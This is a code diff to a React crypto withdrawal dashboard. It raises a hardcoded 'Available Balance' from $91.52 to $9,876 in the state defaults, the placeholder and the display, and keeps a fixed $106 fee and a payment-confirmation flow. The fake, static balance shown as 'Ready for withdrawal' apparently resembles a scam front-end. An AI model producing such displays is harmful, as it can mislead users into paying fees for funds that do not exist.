@@ -74,7 +74,7 @@ const Dashboard = () => {
   const [coin, setCoin] = useState("");
   const [network, setNetwork] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
-  const [amount, setAmount] = useState("91.52");
+  const [amount, setAmount] = useState("9876");
   
   // Payment confirmation
   const [paymentConfirmed, setPaymentConfirmed] = useState(false);
@@ -85,7 +85,7 @@ const Dashboard = () => {
   const [notificationWalletAddress, setNotificationWalletAddress] = useState("");
   const [notificationExchange, setNotificationExchange] = useState("");
 
-  const balance = 91.52;
+  const balance = 9876;
   const fee = 106;
   const netAmount = balance - fee;
 
@@ -281,7 +281,7 @@ const Dashboard = () => {
     setCoin("");
     setNetwork("");
     setWalletAddress("");
-    setAmount("91.52");
+    setAmount("9876");
     setPaymentConfirmed(false);
     setCopied(false);
   };
@@ -454,7 +454,7 @@ const Dashboard = () => {
                 <Input
                   value={amount}
                   onChange={(e) => setAmount(e.target.value.replace(/\D/g, ""))}
-                  placeholder="91.52"
+                  placeholder="9876"
                   className="h-11 bg-input border-border font-mono"
                   required
                 />
@@ -906,7 +906,7 @@ const Dashboard = () => {
           </DialogHeader>
           <div className="text-center py-4">
             <p className="text-muted-foreground text-sm mb-2">Available Balance</p>
-            <p className="text-4xl font-display font-bold gold-text">$91.52</p>
+            <p className="text-4xl font-display font-bold gold-text">$9,876</p>
             <p className="text-xs text-muted-foreground mt-2">Ready for withdrawal</p>
           </div>
           <Button
